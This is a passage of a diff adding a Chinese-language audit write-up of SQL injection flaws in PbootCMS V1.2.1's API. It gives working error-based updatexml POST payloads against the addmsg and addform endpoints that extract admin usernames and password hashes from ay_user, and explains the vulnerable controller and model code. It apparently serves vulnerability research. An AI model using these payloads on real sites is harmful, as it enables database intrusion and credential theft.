+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getList</span><span class="p">(</span><span class="o">$</span><span class="n">acode</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">scode</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">order</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">where</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">fuzzy</span><span class="p">);</span>
+</code></pre></div>
+
+<p>从代码中看他会收集外部所有的 $_GET 带入 getList 进行入库查询 value
+是我们无法控制所以无法注入的，可是key是我们可控制可注入的！！！跟进
+getList方法 路径：PbootCMS-V1.2.1\apps\api\model\CmsModel.php
+function getList(</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 列表内容</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">getList</span><span class="p">(</span><span class="no">$</span><span class="n">acode</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">scode</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">num</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">order</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="nb">where</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">array</span><span class="p">(),</span><span class="w"> </span><span class="no">$</span><span class="n">fuzzy</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">true</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="p">...</span>
+<span class="w">        </span><span class="c1">// 筛选条件支持模糊匹配</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parent</span><span class="p">::</span><span class="n">table</span><span class="p">(</span><span class="s">&#39;ay_content a&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">field</span><span class="p">(</span><span class="no">$</span><span class="n">fields</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="nb">where</span><span class="p">(</span><span class="no">$</span><span class="n">where1</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;OR&#39;</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="nb">where</span><span class="p">(</span><span class="no">$</span><span class="n">where2</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="nb">where</span><span class="p">(</span><span class="no">$</span><span class="nb">where</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;AND&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;AND&#39;</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">fuzzy</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="n">join</span><span class="p">(</span><span class="no">$</span><span class="n">join</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="n">order</span><span class="p">(</span><span class="no">$</span><span class="n">order</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="n">page</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">num</span><span class="p">)</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="n">decode</span><span class="p">()</span>
+<span class="w">            </span><span class="o">-&gt;</span><span class="nb">select</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>这里我把关键代码放出来了，可以看到接收$where以后直接仍进了数据库进行操作造成了注入</p>
+<h2 id="0x102">0x10.2 接口注入二<a class="headerlink" href="#0x102" title="Permanent link">&para;</a></h2>
+<h3 id="0x1021">0x10.2.1 漏洞利用<a class="headerlink" href="#0x1021" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nt">url</span><span class="err">：</span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">cms</span><span class="o">/</span><span class="nt">PbootCMS-V1</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">api</span><span class="p">.</span><span class="nc">php</span><span class="o">/</span><span class="nt">cms</span><span class="o">/</span><span class="nt">addmsg</span>
+<span class="nt">post</span><span class="o">:</span>
+<span class="w">    </span><span class="nt">contacts</span><span class="cp">[</span><span class="nx">contentl</span><span class="err">`</span><span class="p">)</span><span class="w"> </span><span class="nx">VALUES</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">SELECT</span><span class="cm">/**/</span><span class="nx">distinct</span><span class="cm">/**/</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x23</span><span class="p">,</span><span class="nx">username</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="nx">password</span><span class="p">,</span><span class="mh">0x23</span><span class="p">)</span><span class="cm">/**/</span><span class="nx">FROM</span><span class="cm">/**/</span><span class="nx">ay_user</span><span class="cm">/**/</span><span class="nx">limit</span><span class="cm">/**/</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">);</span><span class="o">--</span><span class="w"> </span><span class="nx">a</span><span class="cp">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">111</span>
+<span class="w">    </span><span class="nt">mobile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">111</span>
+<span class="w">    </span><span class="nt">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">111</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId50.png" /></p>
+<p>0x10.2.2 漏洞讲解
+文件：PbootCMS-V1.2.1\apps\api\controller\CmsController.php
+方法：addmsg(</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="err">新增留言</span><span class="w">   </span><span class="err">注入</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">addmsg</span><span class="p">()</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">读取字段</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">form</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getFormField</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;接收表单不存在任何字段，请核对后重试！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">接收数据</span>
+<span class="w">            </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">form</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">field_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">required</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">field_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">description</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;不能为空！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">description</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;：&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">设置其他字段</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;acode&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;acode&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;var&#39;</span><span class="p">)</span><span class="w"> </span><span class="err">?</span><span class="p">:</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">lg</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;user_ip&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ip2long</span><span class="p">(</span><span class="n">get_user_ip</span><span class="p">());</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;user_os&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_user_os</span><span class="p">();</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;user_bs&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_user_bs</span><span class="p">();</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;recontent&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;create_user&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;api&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;update_user&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;api&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">写入数据</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addMessage</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">table_name</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s1">&#39;API提交表单数据成功！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_mail&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_to&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_subject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;来自网站&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">get_http_url</span><span class="p">()</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;（&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;）&#39;</span><span class="p">;</span>
+<span class="w">                    </span><span class="n">sendmail</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(),</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_to&#39;</span><span class="p">),</span><span class="w"> </span><span class="o">$</span><span class="n">mail_subject</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">mail_body</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;表单提交成功！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s1">&#39;API提交表单数据失败！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;表单提交失败！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;表单提交失败，请使用POST方式提交！&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部
+POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
+<div class="codehilite"><pre><span></span><code><span class="err">然后就会带入</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addMessage</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="err">执行语句</span>
+</code></pre></div>
+
+<p>文件：PbootCMS-V1.2.1\apps\api\model\CmsModel.php 函数：addMessage(</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 新增留言</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">addMessage</span><span class="p">(</span><span class="no">$</span><span class="n">table</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">data</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">parent</span><span class="p">::</span><span class="n">table</span><span class="p">(</span><span class="s">&#39;ay_message&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">autoTime</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">insert</span><span class="p">(</span><span class="no">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key
+带入数据库查询引发注入</p>
+<h2 id="0x103">0x10.3 接口注入三<a class="headerlink" href="#0x103" title="Permanent link">&para;</a></h2>
+<h3 id="0x1031">0x10.3.1 漏洞利用<a class="headerlink" href="#0x1031" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nt">url</span><span class="err">：</span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">cms</span><span class="o">/</span><span class="nt">PbootCMS-V1</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">api</span><span class="p">.</span><span class="nc">php</span><span class="o">/</span><span class="nt">cms</span><span class="o">/</span><span class="nt">addform</span><span class="o">?</span><span class="nt">fcode</span><span class="o">=</span><span class="nt">1</span>
+<span class="nt">post</span><span class="o">:</span>
+<span class="w">    </span><span class="nt">contacts</span><span class="cp">[</span><span class="nx">content</span><span class="err">`</span><span class="p">)</span><span class="w"> </span><span class="nx">VALUES</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="k">SELECT</span><span class="cm">/**/</span><span class="nx">distinct</span><span class="cm">/**/</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x23</span><span class="p">,</span><span class="nx">username</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="nx">password</span><span class="p">,</span><span class="mh">0x23</span><span class="p">)</span><span class="cm">/**/</span><span class="nx">FROM</span><span class="cm">/**/</span><span class="nx">ay_user</span><span class="cm">/**/</span><span class="nx">limit</span><span class="cm">/**/</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mh">0x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">);</span><span class="o">--</span><span class="w"> </span><span class="nx">a</span><span class="cp">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">111</span>
+<span class="w">    </span><span class="nt">mobile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">111</span>
+<span class="w">    </span><span class="nt">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">123</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/PbootCMSsql%E6%B3%A8%E5%85%A5/media/rId53.png" /></p>
+<p>0x10.3.2 漏洞讲解</p>
+<div class="codehilite"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="err">表单提交</span><span class="w">  </span><span class="err">注入</span>
+<span class="w">    </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">addform</span><span class="p">()</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">fcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;fcode&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;var&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;传递的表单编码fcode有误！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">读取字段</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">form</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">getFormField</span><span class="p">(</span><span class="o">$</span><span class="n">fcode</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;接收表单不存在任何字段，请核对后重试！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">接收数据</span>
+<span class="w">            </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">form</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">field_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">required</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="w"> </span><span class="o">$</span><span class="n">field_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">description</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;不能为空！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">description</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;：&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">post</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">设置创建时间</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;create_time&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_datetime</span><span class="p">();</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="o">//</span><span class="w"> </span><span class="err">写入数据</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addForm</span><span class="p">(</span><span class="o">$</span><span class="n">value</span><span class="o">-&gt;</span><span class="n">table_name</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s1">&#39;API提交表单数据成功！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_mail&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_to&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_subject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;【PbootCMS】您有新的表单数据，请注意查收！&quot;</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">mail_body</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="s1">&#39;&lt;br&gt;来自网站&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">get_http_url</span><span class="p">()</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;（&#39;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="n">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="s1">&#39;）&#39;</span><span class="p">;</span>
+<span class="w">                    </span><span class="n">sendmail</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(),</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">config</span><span class="p">(</span><span class="s1">&#39;message_send_to&#39;</span><span class="p">),</span><span class="w"> </span><span class="o">$</span><span class="n">mail_subject</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">mail_body</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;表单提交成功！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">log</span><span class="p">(</span><span class="s1">&#39;API提交表单数据失败！&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;表单提交失败！&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">json</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;表单提交失败，请使用POST方式提交！&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部
+POST 内容，只匹配数据库的字段，相同才会拼接到 $_data数组</p>
